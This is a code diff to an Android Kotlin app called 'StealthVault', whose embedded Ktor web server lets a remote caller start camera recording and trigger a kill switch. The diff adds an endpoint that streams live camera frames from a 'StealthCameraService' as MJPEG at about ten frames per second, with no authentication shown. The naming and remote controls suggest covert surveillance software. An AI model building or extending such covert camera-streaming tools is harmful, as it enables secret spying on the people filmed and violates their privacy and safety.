@@ -7,10 +7,13 @@ import android.content.Intent
 import android.os.Build
 import androidx.camera.core.CameraSelector
 import androidx.core.app.NotificationCompat
+import io.ktor.http.ContentType
 import io.ktor.server.application.call
 import io.ktor.server.engine.embeddedServer
 import io.ktor.server.netty.Netty
 import io.ktor.server.netty.NettyApplicationEngine
+import io.ktor.server.response.header
+import io.ktor.server.response.respondOutputStream
 import io.ktor.server.response.respondText
 import io.ktor.server.routing.get
 import io.ktor.server.routing.routing
@@ -31,7 +34,7 @@ class EmbeddedServer(private val appContext: Context) {
                         call.respondText("StealthVault Server is running")
                     }
                     
-                    // 遠隔：録画開始（カメラ向きの指定対応: ?facing=front または back）
+                    // 遠隔：録画開始（カメラ向きの指定対応）
                     get("/start") {
                         val facingParam = call.parameters["facing"]
                         val lensFacing = if (facingParam == "front") {
@@ -69,6 +72,30 @@ class EmbeddedServer(private val appContext: Context) {
                         call.respondText("Executing Kill Switch...")
                         Thread.sleep(500)
                         exitProcess(0)
+                    }
+
+                    // 追加：映像ストリーミング（MJPEG配信）
+                    get("/stream") {
+                        call.response.header("Cache-Control", "no-cache")
+                        call.respondOutputStream(ContentType.parse("multipart/x-mixed-replace; boundary=--myboundary")) {
+                            try {
+                                while (true) {
+                                    val jpeg = StealthCameraService.latestJpeg
+                                    if (jpeg != null) {
+                                        write("--myboundary\r\n".toByteArray())
+                                        write("Content-Type: image/jpeg\r\n".toByteArray())
+                                        write("Content-Length: ${jpeg.size}\r\n\r\n".toByteArray())
+                                        write(jpeg)
+                                        write("\r\n".toByteArray())
+                                        flush()
+                                    }
+                                    // 約10fpsで配信（ネットワーク負荷を抑える）
+                                    Thread.sleep(100)
+                                }
+                            } catch (e: Exception) {
+                                // クライアント側（ブラウザやアプリ）が切断した場合はループを抜けて終了
+                            }
+                        }
                     }
                 }
             }
